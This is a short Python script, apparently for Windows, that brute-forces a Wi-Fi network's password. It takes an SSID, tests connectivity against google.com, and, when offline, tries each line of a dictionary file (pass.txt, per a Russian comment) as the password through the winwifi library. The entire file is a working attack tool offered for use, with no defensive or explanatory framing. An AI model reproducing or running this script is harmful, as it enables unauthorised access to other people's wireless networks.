import winwifi
import time
import requests as rq
a = input("write ssid of wifi>>")
def main(ssid):
    try:
        rq.get("https://google.com")
        rq.post("https://google.com")
        print("you are connected to the network , no brute force is required")
        input()
    except:
        a = open("pass.txt", "r")# под pass.txt, пишем словарь брута
        while True:
            pas = a.readline()
            print(pas, ssid)
            winwifi.WinWiFi.connect(ssid, pas)
            time.sleep(1)
            if not pas:
                break
if __name__ == '__main__':
    main(a)
